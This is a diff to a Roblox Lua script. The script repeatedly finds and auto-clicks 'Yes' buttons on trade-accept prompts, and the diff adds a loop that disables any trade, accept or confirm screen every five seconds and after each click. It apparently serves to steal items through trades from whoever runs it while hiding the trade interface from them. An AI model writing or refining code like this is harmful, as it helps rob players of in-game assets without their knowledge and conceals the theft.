@@ -5,6 +5,30 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+local function resetTradeUI()
+    pcall(function()
+        local tabs = playerGui:FindFirstChild("Tabs")
+        if tabs then
+            local areYouSure = tabs:FindFirstChild("Are You Sure")
+            if areYouSure then
+                areYouSure.Enabled = false
+            end
+            tabs.Enabled = false
+        end
+        GuiService.SelectedObject = nil
+    end)
+
+    pcall(function()
+        for _, gui in ipairs(playerGui:GetDescendants()) do
+            if gui:IsA("ScreenGui") or gui:IsA("Frame") then
+                if gui.Name:lower():find("accept") or gui.Name:lower():find("trade") or gui.Name:lower():find("confirm") then
+                    gui.Enabled = false
+                end
+            end
+        end
+    end)
+end
+
 local function clickButton(button)
     if not button or not button.Parent then return end
 
@@ -30,8 +54,7 @@ local function findYesButton()
             local parent = gui.Parent
             while parent and parent \~= playerGui do
                 if parent:IsA("Frame") or parent:IsA("ScreenGui") then
-                    local textLabels = parent:GetDescendants()
-                    for _, label in ipairs(textLabels) do
+                    for _, label in ipairs(parent:GetDescendants()) do
                         if label:IsA("TextLabel") and label.Text:find("Accept") then
                             return gui
                         end
@@ -44,6 +67,13 @@ local function findYesButton()
     return nil
 end
 
+task.spawn(function()
+    while true do
+        resetTradeUI()
+        task.wait(5)
+    end
+end)
+
 while true do
     local yesButton = findYesButton()
     if yesButton then
@@ -52,6 +82,7 @@ while true do
             clickButton(yesButton)
             task.wait(0.1)
         end
+        resetTradeUI()
     end
     task.wait(0.05)
 end
